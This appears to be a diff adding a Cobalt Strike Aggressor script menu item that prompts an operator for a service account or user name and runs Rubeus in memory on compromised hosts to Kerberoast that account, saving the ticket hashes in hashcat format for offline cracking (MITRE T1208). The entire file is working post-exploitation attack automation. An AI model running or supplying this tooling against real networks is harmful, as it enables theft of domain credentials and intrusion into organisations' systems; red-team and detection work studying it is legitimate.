@@ -1,0 +1,15 @@
+item "Rubeus - Kerberoast Singular User - T1208"{
+
+    local('$bid');
+        foreach $bid ($1){
+            snipekerberoast($bid);
+     }
+    }
+    
+    
+    
+sub snipekerberoast{
+prompt_text("Enter Single SPN/User Name to Kerberoast", "", lambda({
+bexecute_assembly($bids, script_resource('exe/Rubeus.exe'), "kerberoast /user:$1 /output:hashcat");
+}, $bids => $1));
+}    
